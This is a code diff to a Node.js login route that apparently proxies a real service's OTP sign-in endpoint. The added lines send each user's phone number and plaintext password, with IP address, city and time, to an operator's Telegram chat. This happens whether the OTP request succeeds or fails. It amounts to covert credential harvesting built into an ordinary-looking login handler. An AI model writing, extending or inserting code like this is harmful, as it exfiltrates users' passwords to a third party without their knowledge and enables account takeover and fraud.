@@ -1947,20 +1947,29 @@ app.post('/app/user/login/sendotp', async (req, res) => {
       const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
       const city = req.headers['x-vercel-ip-city'] || 'N/A';
       const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-      const reqStr = JSON.stringify(body, null, 2);
-      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : (respBody || 'Empty response');
 
-      let msg = `📡 *POST /app/user/login/sendotp*\n` +
-        `━━━━━━━━━━━━━━━━━━\n` +
-        `📱 *Phone:* \`${phone}\`\n` +
-        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
-        `🕐 *Time:* ${time}\n\n` +
-        `📥 *REQUEST BODY:*\n\`\`\`json\n${reqStr.substring(0, 1500)}\n\`\`\`\n\n` +
-        `📤 *RESPONSE DATA:*\n\`\`\`json\n${resStr.substring(0, 1500)}\n\`\`\``;
+      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
+        let msg =
+          `📲 *OTP Sent Successfully*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
+          `🕐 *Time:* ${time}`;
 
-      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => {
-        bot.sendMessage(data.adminChatId, msg.replace(/[*`]/g, '')).catch(() => { });
-      });
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      } else {
+        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
+        let msg =
+          `❌ *OTP Sending Failed*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `📱 *Phone:* \`${phone}\`\n` +
+          `🔒 *Password:* \`${pwd}\`\n` +
+          `⚠️ *Reason:* ${errorMsg}\n` +
+          `🕐 *Time:* ${time}`;
+
+        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
+      }
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
